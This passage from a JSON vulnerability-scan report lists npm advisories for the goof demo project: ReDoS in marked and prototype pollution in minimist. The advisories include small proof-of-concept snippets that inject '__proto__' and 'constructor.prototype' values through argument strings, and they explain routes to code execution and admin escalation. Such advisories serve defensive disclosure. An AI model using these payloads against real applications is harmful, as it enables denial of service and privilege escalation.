\"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"marked@0.3.5\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"marked@0.3.9\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": true,\n  \"name\": \"marked\",\n  \"version\": \"0.3.5\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , marked@0.3.5 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "185",
              "400"
            ],
            "cveid": [],
            "ghsaid": [
              "xf5p-87ch-gxw2"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Regular Expression Denial of Service (ReDoS)",
          "id": "npm:marked:20180225",
          "desc": "## Overview\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). This can cause an impact of about 10 seconds matching time for data 150 characters long.\r\n\r\n## Disclosure Timeline\r\n* Feb 21th, 2018 - Initial Disclosure to package owner\r\n* Feb 21th, 2018 - Initial Response from package owner\r\n* Feb 26th, 2018 - Fix issued\r\n* Feb 27th, 2018 - Vulnerability published\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `marked` to version 0.3.18 or higher.\n## References\n- [GitHub Commit](https://github.com/markedjs/marked/pull/1083/commits/b15e42b67cec9ded8505e9d68bb8741ad7a9590d)\n- [GitHub PR](https://github.com/markedjs/marked/pull/1083)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C\",\n  \"alternativeIds\": [\n    \"SNYK-JS-MARKED-10990\"\n  ],\n  \"creationTime\": \"2018-02-27T15:06:27.571000Z\",\n  \"credit\": [\n    \"Jamie Davis\"\n  ],\n  \"cvssScore\": 7.5,\n  \"description\": \"## Overview\\n[marked](https://marked.js.org/) is a low-level compiler for parsing markdown without caching or blocking for long periods of time.\\n\\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). This can cause an impact of about 10 seconds matching time for data 150 characters long.\\r\\n\\r\\n## Disclosure Timeline\\r\\n* Feb 21th, 2018 - Initial Disclosure to package owner\\r\\n* Feb 21th, 2018 - Initial Response from package owner\\r\\n* Feb 26th, 2018 - Fix issued\\r\\n* Feb 27th, 2018 - Vulnerability published\\n\\n## Details\\n\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\n\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\n\\nLet’s take the following regular expression as an example:\\n```js\\nregex = /A(B|C+)+D/\\n```\\n\\nThis regular expression accomplishes the following:\\n- `A` The string must start with the letter 'A'\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\n\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\n\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\n\\n```bash\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\n0.04s user 0.01s system 95% cpu 0.052 total\\n\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\n1.79s user 0.02s system 99% cpu 1.812 total\\n```\\n\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\n\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\n\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\n1. CCC\\n2. CC+C\\n3. C+CC\\n4. C+C+C.\\n\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\n\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\n\\n| String | Number of C's | Number of steps |\\n| -------|-------------:| -----:|\\n| ACCCX | 3 | 38\\n| ACCCCX | 4 | 71\\n| ACCCCCX | 5 | 136\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\n\\n\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\n\\n## Remediation\\nUpgrade `marked` to version 0.3.18 or higher.\\n## References\\n- [GitHub Commit](https://github.com/markedjs/marked/pull/1083/commits/b15e42b67cec9ded8505e9d68bb8741ad7a9590d)\\n- [GitHub PR](https://github.com/markedjs/marked/pull/1083)\\n\",\n  \"disclosureTime\": \"2018-02-27T15:06:27Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"0.3.18\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"npm:marked:20180225\",\n  \"identifiers\": {\n    \"ALTERNATIVE\": [\n      \"SNYK-JS-MARKED-10990\"\n    ],\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-185\",\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-xf5p-87ch-gxw2\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-14T14:41:40.590404Z\",\n  \"moduleName\": \"marked\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"marked\",\n  \"patches\": [],\n  \"proprietary\": true,\n  \"publicationTime\": \"2018-02-27T16:32:24Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/markedjs/marked/pull/1083/commits/b15e42b67cec9ded8505e9d68bb8741ad7a9590d\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/markedjs/marked/pull/1083\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<0.3.18\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Regular Expression Denial of Service (ReDoS)\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"marked@0.3.5\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"marked@0.3.18\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"marked\",\n  \"version\": \"0.3.5\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , marked@0.3.5 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-003173",
              "CCI-001643"
            ],
            "nist": [
              "SA-11",
              "RA-5"
            ],
            "cweid": [
              "1321"
            ],
            "cveid": [
              "2021-44906"
            ],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-MINIMIST-2429795",
          "desc": "## Overview\n[minimist](https://www.npmjs.com/package/minimist) is a parse argument options module.\n\nAffected versions of this package are vulnerable to Prototype Pollution due to a missing handler to `Function.prototype`.\r\n**Note:** this is a bypass to [CVE-2020-7598](https://security.snyk.io/vuln/SNYK-JS-MINIMIST-559764)\r\n\r\n## PoC by Snyk\r\n```js\r\nrequire('minimist')('--_.constructor.constructor.prototype.foo bar'.split(' '));\r\nconsole.log((function(){}).foo); // bar\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `minimist` to version 1.2.6 or higher.\n## References\n- [Fix Commit](https://github.com/substack/minimist/commit/c2b981977fa834b223b408cfb860f933c9811e4d)\n- [GitHub Issue](https://github.com/substack/minimist/issues/164)\n- [Vulnerable Code](https://github.com/substack/minimist/blob/master/index.js#L69)\n",
          "impact": 0.3,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2022-03-18T13:02:08.840039Z\",\n  \"credit\": [\n    \"Unknown\"\n  ],\n  \"cvssScore\": 3.7,\n  \"description\": \"## Overview\\n[minimist](https://www.npmjs.com/package/minimist) is a parse argument options module.\\n\\nAffected versions of this package are vulnerable to Prototype Pollution due to a missing handler to `Function.prototype`.\\r\\n**Note:** this is a bypass to [CVE-2020-7598](https://security.snyk.io/vuln/SNYK-JS-MINIMIST-559764)\\r\\n\\r\\n## PoC by Snyk\\r\\n```js\\r\\nrequire('minimist')('--_.constructor.constructor.prototype.foo bar'.split(' '));\\r\\nconsole.log((function(){}).foo); // bar\\r\\n```\\n\\n## Details\\n\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\n\\nThere are two main ways in which the pollution of prototypes occurs:\\n\\n-   Unsafe `Object` recursive merge\\n    \\n-   Property definition by path\\n    \\n\\n### Unsafe Object recursive merge\\n\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\n```\\nmerge (target, source)\\n\\n  foreach property of source\\n\\n    if property exists and is an object on both the target and the source\\n\\n      merge(target[property], source[property])\\n\\n    else\\n\\n      target[property] = source[property]\\n```\\n<br>  \\n\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\n\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\n\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\\n\\n### Property definition by path\\n\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\n\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\n\\n## Types of attacks\\n\\nThere are a few methods by which Prototype Pollution can be manipulated:\\n\\n| Type |Origin  |Short description |\\n|--|--|--|\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\n\\n## Affected environments\\n\\nThe following environments are susceptible to a Prototype Pollution attack:\\n\\n-   Application server\\n    \\n-   Web server\\n    \\n\\n## How to prevent\\n\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\n    \\n2.  Require schema validation of JSON input.\\n    \\n3.  Avoid using unsafe recursive merge functions.\\n    \\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\n    \\n5.  As a best practice use `Map` instead of `Object`.\\n\\n### For more information on this vulnerability type:\\n\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\nUpgrade `minimist` to version 1.2.6 or higher.\\n## References\\n- [Fix Commit](https://github.com/substack/minimist/commit/c2b981977fa834b223b408cfb860f933c9811e4d)\\n- [GitHub Issue](https://github.com/substack/minimist/issues/164)\\n- [Vulnerable Code](https://github.com/substack/minimist/blob/master/index.js#L69)\\n\",\n  \"disclosureTime\": \"2022-03-18T12:24:05Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"1.2.6\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-MINIMIST-2429795\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2021-44906\"\n    ],\n    \"CWE\": [\n      \"CWE-1321\"\n    ],\n    \"SNYK\": [\n      \"SNYK-JS-MINIMIST-559764\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2022-03-22T13:31:59.687436Z\",\n  \"moduleName\": \"minimist\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"minimist\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2022-03-21T12:09:35Z\",\n  \"references\": [\n    {\n      \"title\": \"Fix Commit\",\n      \"url\": \"https://github.com/substack/minimist/commit/c2b981977fa834b223b408cfb860f933c9811e4d\"\n    },\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/substack/minimist/issues/164\"\n    },\n    {\n      \"title\": \"Vulnerable Code\",\n      \"url\": \"https://github.com/substack/minimist/blob/master/index.js%23L69\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<1.2.6\"\n    ]\n  },\n  \"severity\": \"low\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"low\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"hbs@4.0.4\",\n    \"handlebars@4.0.14\",\n    \"optimist@0.6.1\",\n    \"minimist@0.0.10\"\n  ],\n  \"upgradePath\": [],\n  \"isUpgradable\": false,\n  \"isPatchable\": false,\n  \"name\": \"minimist\",\n  \"version\": \"0.0.10\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , hbs@4.0.4 , handlebars@4.0.14 , optimist@0.6.1 , minimist@0.0.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , coveralls@3.0.9 , minimist@1.2.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , mkdirp@0.5.1 , minimist@0.0.8 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , mkdirp@0.5.1 , minimist@0.0.8 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , caching-transform@1.0.1 , mkdirp@0.5.1 , minimist@0.0.8 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , find-cache-dir@0.1.1 , mkdirp@0.5.1 , minimist@0.0.8 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-report@1.1.3 , mkdirp@0.5.1 , minimist@0.0.8 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-source-maps@1.2.3 , mkdirp@0.5.1 , minimist@0.0.8 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , spawn-wrap@1.4.2 , mkdirp@0.5.1 , minimist@0.0.8 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-reports@1.4.0 , handlebars@4.0.11 , optimist@0.6.1 , minimist@0.0.8 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , typeorm@0.2.24 , mkdirp@0.5.5 , minimist@1.2.5 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2020-7598"
            ],
            "ghsaid": [
              "vh95-rmgr-6w4m"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-MINIMIST-559764",
          "desc": "## Overview\n[minimist](https://www.npmjs.com/package/minimist) is a parse argument options module.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The library could be tricked into adding or modifying properties of `Object.prototype` using a `constructor` or `__proto__` payload.\r\n\r\n## PoC by Snyk\r\n```\r\nrequire('minimist')('--__proto__.injected0 value0'.split(' '));\r\nconsole.log(({}).injected0 === 'value0'); // true\r\n\r\nrequire('minimist')('--constructor.prototype.injected1 value1'.split(' '));\r\nconsole.log(({}).injected1 === 'value1'); // true\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `minimist` to version 0.2.1, 1.2.3 or higher.\n## References\n- [Command Injection PoC](https://gist.github.com/Kirill89/47feb345b09bf081317f08dd43403a8a)\n- [GitHub Fix Commit #1](https://github.com/substack/minimist/commit/63e7ed05aa4b1889ec2f3b196426db4500cbda94)\n- [GitHub Fix Commit #2](https://github.com/substack/minimist/commit/38a4d1caead72ef99e824bb420a2528eec03d9ab)\n- [Snyk Research Blog](https://snyk.io/blog/prototype-pollution-minimist/)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2020-03-11T08:25:47.093051Z\",\n  \"credit\": [\n    \"Snyk Security Team\"\n  ],\n  \"cvssScore\": 5.6,\n  \"description\": \"## Overview\\n[minimist](https://www.npmjs.com/package/minimist) is a parse argument options module.\\n\\nAffected versions of this package are vulnerable to Prototype Pollution. The library could be tricked into adding or modifying properties of `Object.prototype` using a `constructor` or `__proto__` payload.\\r\\n\\r\\n## PoC by Snyk\\r\\n```\\r\\nrequire('minimist')('--__proto__.injected0 value0'.split(' '));\\r\\nconsole.log(({}).injected0 === 'value0'); // true\\r\\n\\r\\nrequire('minimist')('--constructor.prototype.injected1 value1'.split(' '));\\r\\nconsole.log(({}).injected1 === 'value1'); // true\\r\\n```\\n\\n## Details\\n\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as 